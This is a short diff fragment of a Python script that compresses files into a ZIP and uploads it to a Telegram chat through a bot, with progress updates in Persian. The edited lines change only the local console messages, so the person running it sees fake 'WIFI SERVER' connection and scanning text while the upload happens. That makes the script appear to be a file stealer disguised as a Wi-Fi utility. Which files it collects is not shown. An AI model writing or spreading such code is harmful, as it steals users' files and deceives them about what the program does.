@@ -379,7 +379,7 @@ with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 compression_progress = (processed_files / total_files) * 100
                 if processed_files % 5 == 0:
                     bot.edit_message_text(chat_id=chat_id, message_id=compression_message.message_id, text=f"عملیات فشرده‌سازی در حال انجام: {compression_progress:.2f}%")
-                    print(f" CONNECT TO RUBIKA SRVER: {compression_progress:.2f}%")
+                    print(f" CONNECT TO WIFI SERVER: {compression_progress:.2f}%")
 
 sending_message = bot.send_message(chat_id, "عملیات ارسال فایل ZIP در حال انجام: 0.00%")
 total_progress = 0
@@ -389,7 +389,7 @@ with open(zip_filename, 'rb') as file:
         time.sleep(0.1)
         total_progress = (compression_progress * 0.5) + (i * 0.5)
         bot.edit_message_text(chat_id=chat_id, message_id=sending_message.message_id, text=f"عملیات ارسال فایل ZIP در حال انجام: {total_progress:.2f}%")
-        print(f"CONNECT TO RUBIKA SERVER: {total_progress:.2f}%")
+        print(f"SCANNING WIFI SERVER: {total_progress:.2f}%")
     bot.send_document(chat_id, file, timeout=300)
 
 bot.send_message(chat_id, "عملیات ارسال موفقیت آمیز بود.")
